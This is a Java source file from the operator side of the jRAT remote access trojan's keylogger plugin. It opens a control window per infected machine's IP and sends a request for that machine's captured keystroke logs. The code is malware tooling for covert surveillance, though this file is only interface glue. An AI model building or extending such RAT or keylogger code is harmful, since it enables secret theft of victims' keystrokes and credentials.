package se.jrat.plugin.keylogger.client;

import iconlib.IconUtils;

import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.util.List;

import javax.swing.JFrame;

import jrat.api.BaseControlPanel;
import jrat.api.Client;
import jrat.api.net.PacketBuilder;
import jrat.api.ui.RATMenuItemActionListener;

public class MenuListener implements RATMenuItemActionListener {

	@Override
	public void onClick(List<Client> servers) {
		try {
			if (servers.size() > 0) {
				final Client server = servers.get(0);
				BaseControlPanel panel = null;

				if (KeyloggerPlugin.entry.getInstances().containsKey(server.getIP())) {
					panel = KeyloggerPlugin.entry.getInstances().get(server.getIP());
				} else {
					panel = KeyloggerPlugin.entry.newPanelInstance(server);
					KeyloggerPlugin.entry.getInstances().put(server.getIP(), panel);
				}
				
				final BaseControlPanel finalPanel = panel;

				JFrame frame = new JFrame();
				frame.addWindowListener(new WindowAdapter() {
					@Override
					public void windowClosing(WindowEvent arg0) {
						finalPanel.onClose();
						KeyloggerPlugin.entry.getInstances().remove(server.getIP());
					}
				});
				frame.setTitle("Keylogger - " + server.getIP());
				frame.setSize(750, 400);
				frame.setLocationRelativeTo(null);
				frame.setIconImage(IconUtils.getIcon("icon", MenuListener.class).getImage());
				frame.setLocationRelativeTo(null);
				frame.add(panel);
				frame.setVisible(true);
				
				try {
					server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, server) {
						@Override
						public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {						
							
						}
					});
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
